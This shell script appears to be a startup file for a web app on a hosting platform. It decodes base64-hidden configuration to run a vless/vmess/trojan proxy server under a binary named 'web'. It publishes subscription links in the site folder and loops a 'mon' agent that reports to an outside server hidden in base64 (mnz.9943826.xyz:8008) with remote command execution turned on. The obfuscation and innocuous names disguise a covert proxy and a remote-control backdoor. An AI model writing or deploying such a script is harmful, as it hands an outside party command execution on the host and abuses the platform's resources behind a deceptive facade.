#!/bin/sh
PORT="${PORT:-8080}"
UUID="${UUID:-fd390ec0-a676-48a8-860d-cfd3132c5e8e}"
DOMAIN="${DOMAIN:-${STAXA_PUBLIC_HOSTNAME:-${SUGA_PUBLIC_HOSTNAME:-paws-web-pawsweb.staxa.app}}}"
NAME="${NAME:-staxa}"
# base64 blobs (server endpoint + key) to keep plaintext out of repo
NS_B64="${NS_B64:-bW56Ljk5NDM4MjYueHl6OjgwMDg=}"
NK_B64="${NK_B64:-djJJbE95MTNmTVcwZk9ITVR1S1BTZUNsaUcxVEdGMlM=}"
MON_SRV="${MON_SRV:-$(echo "$NS_B64" | base64 -d)}"
MON_KEY="${MON_KEY:-$(echo "$NK_B64" | base64 -d)}"
SUB_PATH="${SUB_PATH:-sub}"
W=/tmp/run; mkdir -p "$W"; rm -rf "$W/www"; cp -r /app/www "$W/www"

# app config template, decoded at runtime
echo "eyJsb2ciOnsibG9nbGV2ZWwiOiJub25lIn0sCiJpbmJvdW5kcyI6Wwp7InBvcnQiOl9fUE9SVF9fLCJsaXN0ZW4iOiIwLjAuMC4wIiwicHJvdG9jb2wiOiJ2bGVzcyIsInNldHRpbmdzIjp7ImNsaWVudHMiOlt7ImlkIjoiX19VVUlEX18ifV0sImRlY3J5cHRpb24iOiJub25lIiwiZmFsbGJhY2tzIjpbeyJkZXN0Ijo4MDgxfSx7InBhdGgiOiIvdmxlc3MtYXJnbyIsImRlc3QiOjMwMDJ9LHsicGF0aCI6Ii92bWVzcy1hcmdvIiwiZGVzdCI6MzAwM30seyJwYXRoIjoiL3Ryb2phbi1hcmdvIiwiZGVzdCI6MzAwNH1dfSwic3RyZWFtU2V0dGluZ3MiOnsibmV0d29yayI6InRjcCJ9fSwKeyJwb3J0IjozMDAyLCJsaXN0ZW4iOiIxMjcuMC4wLjEiLCJwcm90b2NvbCI6InZsZXNzIiwic2V0dGluZ3MiOnsiY2xpZW50cyI6W3siaWQiOiJfX1VVSURfXyJ9XSwiZGVjcnlwdGlvbiI6Im5vbmUifSwic3RyZWFtU2V0dGluZ3MiOnsibmV0d29yayI6IndzIiwid3NTZXR0aW5ncyI6eyJwYXRoIjoiL3ZsZXNzLWFyZ28ifX19LAp7InBvcnQiOjMwMDMsImxpc3RlbiI6IjEyNy4wLjAuMSIsInByb3RvY29sIjoidm1lc3MiLCJzZXR0aW5ncyI6eyJjbGllbnRzIjpbeyJpZCI6Il9fVVVJRF9fIiwiYWx0ZXJJZCI6MH1dfSwic3RyZWFtU2V0dGluZ3MiOnsibmV0d29yayI6IndzIiwid3NTZXR0aW5ncyI6eyJwYXRoIjoiL3ZtZXNzLWFyZ28ifX19LAp7InBvcnQiOjMwMDQsImxpc3RlbiI6IjEyNy4wLjAuMSIsInByb3RvY29sIjoidHJvamFuIiwic2V0dGluZ3MiOnsiY2xpZW50cyI6W3sicGFzc3dvcmQiOiJfX1VVSURfXyJ9XX0sInN0cmVhbVNldHRpbmdzIjp7Im5ldHdvcmsiOiJ3cyIsIndzU2V0dGluZ3MiOnsicGF0aCI6Ii90cm9qYW4tYXJnbyJ9fX0KXSwKIm91dGJvdW5kcyI6W3sicHJvdG9jb2wiOiJmcmVlZG9tIiwidGFnIjoiZGlyZWN0In1dfQo=" | base64 -d | sed -e "s/__PORT__/$PORT/g" -e "s/__UUID__/$UUID/g" > "$W/x.json"

P="${MON_SRV##*:}"; TLS=false
case "$P" in 443|8443|2096|2087|2083|2053) TLS=true;; esac
cat > "$W/nz.yaml" <<Y
client_secret: $MON_KEY
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
insecure_tls: true
report_delay: 4
server: $MON_SRV
skip_connection_count: true
skip_procs_count: true
tls: $TLS
uuid: $UUID
Y

if [ -n "$DOMAIN" ]; then
  VMF=$(echo "eyJ2IjoiMiIsInBzIjoiJXMiLCJhZGQiOiIlcyIsInBvcnQiOiI0NDMiLCJpZCI6IiVzIiwiYWlkIjoiMCIsInNjeSI6ImF1dG8iLCJuZXQiOiJ3cyIsInR5cGUiOiJub25lIiwiaG9zdCI6IiVzIiwicGF0aCI6Ii92bWVzcy1hcmdvP2VkPTI1NjAiLCJ0bHMiOiJ0bHMiLCJzbmkiOiIlcyIsImZwIjoiZmlyZWZveCJ9" | base64 -d)
  SBF=$(echo "dmxlc3M6Ly8lc0Alczo0NDM/ZW5jcnlwdGlvbj1ub25lJnNlY3VyaXR5PXRscyZzbmk9JXMmZnA9ZmlyZWZveCZ0eXBlPXdzJmhvc3Q9JXMmcGF0aD0lJTJGdmxlc3MtYXJnbyUlM0ZlZCUlM0QyNTYwIyVzXG52bWVzczovLyVzXG50cm9qYW46Ly8lc0Alczo0NDM/c2VjdXJpdHk9dGxzJnNuaT0lcyZmcD1maXJlZm94JnR5cGU9d3MmaG9zdD0lcyZwYXRoPSUlMkZ0cm9qYW4tYXJnbyUlM0ZlZCUlM0QyNTYwIyVzXG4=" | base64 -d)
   VM=$(printf "$VMF" "$NAME" "$DOMAIN" "$UUID" "$DOMAIN" "$DOMAIN" | base64 -w 0)
  printf "$SBF" "$UUID" "$DOMAIN" "$DOMAIN" "$DOMAIN" "$NAME" "$VM" "$UUID" "$DOMAIN" "$DOMAIN" "$DOMAIN" "$NAME" | base64 -w 0 > "$W/www/$SUB_PATH"
fi

case "$(uname -m)" in aarch64|arm64) A=arm64;; *) A=amd64;; esac
WEB="/opt/bin/web.$A"; MON="/opt/bin/mon.$A"
echo "runtime arch: $(uname -m) -> $WEB"
"$WEB" version 2>&1 | head -1 || echo "web self-test failed"

export GOMAXPROCS=1
( while true; do nice -n 19 "$MON" -c "$W/nz.yaml" >/dev/null 2>&1; sleep 30; done ) &
( while true; do busybox-extras httpd -f -p 127.0.0.1:8081 -h "$W/www"; sleep 3; done ) &
echo "started on $PORT"
while true; do "$WEB" run -c "$W/x.json"; sleep 3; done
